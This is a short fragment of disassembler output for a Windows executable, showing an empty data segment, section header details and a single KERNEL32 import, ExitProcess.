; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 415000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 00016000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00014600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; void __stdcall __imp_ExitProcess(UINT	uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr



		end start
